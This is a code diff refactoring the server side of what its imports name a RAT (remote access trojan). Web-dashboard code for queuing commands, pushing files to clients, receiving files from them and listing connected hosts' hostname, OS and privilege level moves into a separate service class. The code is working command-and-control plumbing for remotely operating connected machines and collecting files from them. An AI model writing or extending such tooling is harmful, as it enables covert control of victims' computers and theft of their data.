@@ -1,12 +1,10 @@
 import json
-import shutil
+import os
 import socket
 import subprocess
 import sys
 import threading
 import time
-import uuid
-from datetime import datetime
 
 from core.protocol.ratsocket import RATSocket
 from core.utils.logger import logger
@@ -19,7 +17,7 @@ from server.config.config import SOCKET_ADDR
 from core.utils.server_util import *
 from server.connection.client_connection import ClientConnection
 from server.connection.connection_manager import ConnectionManager
-from server.web.event_bus import WebEventBus
+from server.web.service import ServerWebService
 
 
 class Server:
@@ -32,136 +30,21 @@ class Server:
         self.socket = RATSocket()
         self.connections = ConnectionManager()
         self.alias_manager = AliasManager()
-        #web
-        self.event_bus = WebEventBus()
-        self._tasks = {}
-        self._tasks_lock = threading.RLock()
 
-        # web 文件区
-        self.web_root_dir = os.path.abspath(os.path.join('runtime', 'web_files'))
-        self.received_files_dir = os.path.join(self.web_root_dir, 'received')
-        self.upload_tmp_dir = os.path.join(self.web_root_dir, 'upload_tmp')
-        self.http_uploads_dir = os.path.join(self.web_root_dir, 'http_uploads')
-        self._prepare_web_dirs()
+        # web
+        self.web_service = ServerWebService(self)
 
+    # ------------------ web bridge ------------------ #
+    def get_connections_payload(self):
+        return self.web_service.get_connections_payload()
 
-    #web files start
-
-    def notify_file_received(self, client_id: str, original_name: str, saved_path: str, size: int):
-        # saved_name = os.path.basename(saved_path)
-
-        self.event_bus.publish('file_received', {
-            'client_id': client_id,
-            'original_name': original_name,
-            'saved_name': os.path.basename(saved_path),
-            'saved_path': saved_path,
-            'size': size,
-            'created_at': datetime.now().isoformat(),
-            # 'download_url': f'/api/files/recent/{saved_name}',
-        })
-
-
-
-    def _prepare_web_dirs(self):
-        os.makedirs(self.received_files_dir, exist_ok=True)
-        os.makedirs(self.upload_tmp_dir, exist_ok=True)
-        os.makedirs(self.http_uploads_dir, exist_ok=True)
-
-
-    def _build_unique_file_path(self, directory: str, filename: str) -> str:
-        safe_name = os.path.basename(filename) or 'file.bin'
-        base, ext = os.path.splitext(safe_name)
-        candidate = os.path.join(directory, safe_name)
-        index = 1
-        while os.path.exists(candidate):
-            candidate = os.path.join(directory, f'{base}_{index}{ext}')
-            index += 1
-        return candidate
-
+    def submit_web_command(self, client_id: str, command: str):
+        return self.web_service.submit_command(client_id, command)
 
     def submit_web_upload(self, client_id: str, local_path: str, display_name: str):
-        conn = self.get_target_connection_by_client_id(client_id)
-        task = self._create_task(client_id, f'upload {display_name}')
+        return self.web_service.submit_upload(client_id, local_path, display_name)
 
-        threading.Thread(
-            target=self._run_web_upload,
-            args=(conn, task['task_id'], local_path, display_name),
-            daemon=True
-        ).start()
-
-        return {
-            'task_id': task['task_id'],
-            'client_id': client_id,
-            'command': f'upload {display_name}'
-        }
-
-    def _run_web_upload(self, conn: ClientConnection, task_id: str, local_path: str, display_name: str):
-        ok = True
-        try:
-            for status, result in conn.send_file(local_path):
-                text = '' if result is None else str(result)
-                self._append_task_chunk(task_id, status, text)
-
-                self.event_bus.publish('command_result', {
-                    'task_id': task_id,
-                    'client_id': conn.info.get('id'),
-                    'command': f'upload {display_name}',
-                    'status': status,
-                    'text': text,
-                    'time': datetime.now().isoformat()
-                })
-
-                if status == 0:
-                    ok = False
-        except Exception as e:
-            ok = False
-            text = str(e)
-            self._append_task_chunk(task_id, 0, text)
-
-            self.event_bus.publish('command_result', {
-                'task_id': task_id,
-                'client_id': conn.info.get('id'),
-                'command': f'upload {display_name}',
-                'status': 0,
-                'text': text,
-                'time': datetime.now().isoformat()
-            })
-        finally:
-            self._finish_task(task_id, ok)
-            self.event_bus.publish('command_complete', {
-                'task_id': task_id,
-                'client_id': conn.info.get('id'),
-                'command': f'upload {display_name}',
-                'success': ok,
-                'time': datetime.now().isoformat()
-            })
-
-            try:
-                if os.path.exists(local_path):
-                    os.remove(local_path)
-                parent_dir = os.path.dirname(local_path)
-                if parent_dir.startswith(self.upload_tmp_dir) and os.path.isdir(parent_dir):
-                    shutil.rmtree(parent_dir, ignore_errors=True)
-            except Exception:
-                pass
-    #web files end
-
-    #web start
-    def _serialize_connection(self, conn: ClientConnection) -> dict:
-        info = conn.info or {}
-        return {
-            'client_id': info.get('id'),
-            'addr': info.get('addr', ''),
-            'os_type': info.get('os_type', 'Unknown'),
-            'os_ver': info.get('os_ver', 'Unknown'),
-            'hostname': info.get('hostname', 'Unknown'),
-            'integrity': info.get('integrity', '?'),
-            'cwd': info.get('cwd', ''),
-        }
-
-    def get_connections_payload(self):
-        return [self._serialize_connection(conn) for conn in self.connections.all()]
-
+    # ------------------ connection lookup ------------------ #
     def get_target_connection_by_client_id(self, client_id) -> ClientConnection:
         try:
             return self.connections.get_by_client_id(client_id)
@@ -171,107 +54,6 @@ class Server:
     def kill_connection_by_client_id(self, client_id):
         conn = self.get_target_connection_by_client_id(client_id)
         conn.send_command('kill')
-
-    def _create_task(self, client_id: str, command: str):
-        task_id = uuid.uuid4().hex
-        task = {
-            'task_id': task_id,
-            'client_id': client_id,
-            'command': command,
-            'status': 'running',
-            'created_at': datetime.now().isoformat(),
-            'finished_at': None,
-            'chunks': []
-        }
-        with self._tasks_lock:
-            self._tasks[task_id] = task
-        return task
-
-    def _append_task_chunk(self, task_id: str, status: int, text: str):
-        with self._tasks_lock:
-            task = self._tasks.get(task_id)
-            if not task:
-                return
-            task['chunks'].append({
-                'status': status,
-                'text': text,
-                'time': datetime.now().isoformat()
-            })
-
-    def _finish_task(self, task_id: str, ok: bool):
-        with self._tasks_lock:
-            task = self._tasks.get(task_id)
-            if not task:
-                return
-            task['status'] = 'success' if ok else 'error'
-            task['finished_at'] = datetime.now().isoformat()
-
-    def submit_web_command(self, client_id: str, command: str):
-        conn = self.get_target_connection_by_client_id(client_id)
-        task = self._create_task(client_id, command)
-
-        threading.Thread(
-            target=self._run_web_command,
-            args=(conn, task['task_id'], command),
-            daemon=True
-        ).start()
-
-        return {
-            'task_id': task['task_id'],
-            'client_id': client_id,
-            'command': command
-        }
-
-    def _run_web_command(self, conn: ClientConnection, task_id: str, command: str):
-        ok = True
-        try:
-            executor = CommandExecutor(conn, self)
-            func = executor.process_command(command)
-            if not func:
-                raise RuntimeError('Unable to resolve command')
-
-            for status, result in func():
-                text = '' if result is None else str(result)
-                self._append_task_chunk(task_id, status, text)
-
-                self.event_bus.publish('command_result', {
-                    'task_id': task_id,
-                    'client_id': conn.info.get('id'),
-                    'command': command,
-                    'status': status,
-                    'text': text,
-                    'time': datetime.now().isoformat()
-                })
-
-                if status == 0:
-                    ok = False
-
-        except Exception as e:
-            ok = False
-            text = str(e)
-            self._append_task_chunk(task_id, 0, text)
-
-            self.event_bus.publish('command_result', {
-                'task_id': task_id,
-                'client_id': conn.info.get('id'),
-                'command': command,
-                'status': 0,
-                'text': text,
-                'time': datetime.now().isoformat()
-            })
-
-        finally:
-            self._finish_task(task_id, ok)
-            self.event_bus.publish('command_complete', {
-                'task_id': task_id,
-                'client_id': conn.info.get('id'),
-                'command': command,
-                'success': ok,
-                'time': datetime.now().isoformat()
-            })
-
-
-    #web end
 
     # ------------------ 连接建立 ------------------ #
     def _bind_server_socket(self):
@@ -311,39 +93,12 @@ class Server:
     def _register_connection(self, conn, addr, info: dict) -> ClientConnection:
         # connection = ClientConnection(conn, addr, info)
 
-        #web files
-        connection = ClientConnection(
-            conn,
-            addr,
-            info,
-            file_save_dir=self.received_files_dir,
-            on_file_saved=lambda original_name, saved_path, size: self.notify_file_received(
-                info.get('id'),
-                original_name,
-                saved_path,
-                size
-            )
-        )
-        #web files end
-
-        def _unexpected_message_callback(status, text, end):
-            self.event_bus.publish('background_message', {
-                'client_id': connection.info.get('id'),
-                'status': status,
-                'text': text,
-                'eof': end,
-                'time': datetime.now().isoformat()
-            })
-
-        connection.on_unexpected_message = _unexpected_message_callback
+        connection = self.web_service.build_connection(conn, addr, info)
 
         self.connections.add(connection)
         logger.info('Connection has been established: {}'.format(addr))
 
-        self.event_bus.publish('connection_online', {
-            'connection': self._serialize_connection(connection),
-            'time': datetime.now().isoformat()
-        })
+        self.web_service.on_connection_registered(connection)
 
         return connection
     #web end
@@ -418,10 +173,7 @@ class Server:
         logger.error(f'Connection closed: {conn.address}')
 
         #web
-        self.event_bus.publish('connection_offline', {
-            'client_id': conn.info.get('id'),
-            'time': datetime.now().isoformat()
-        })
+        self.web_service.on_connection_closed(conn)
         #web end
         self._notify_connection_closed(conn)
         self._remove_connection(conn)
@@ -642,4 +394,3 @@ if __name__ == '__main__':
     server = Server(SOCKET_ADDR)
     threading.Thread(target=server.serve, daemon=True).start()
     server.cmdloop()
-
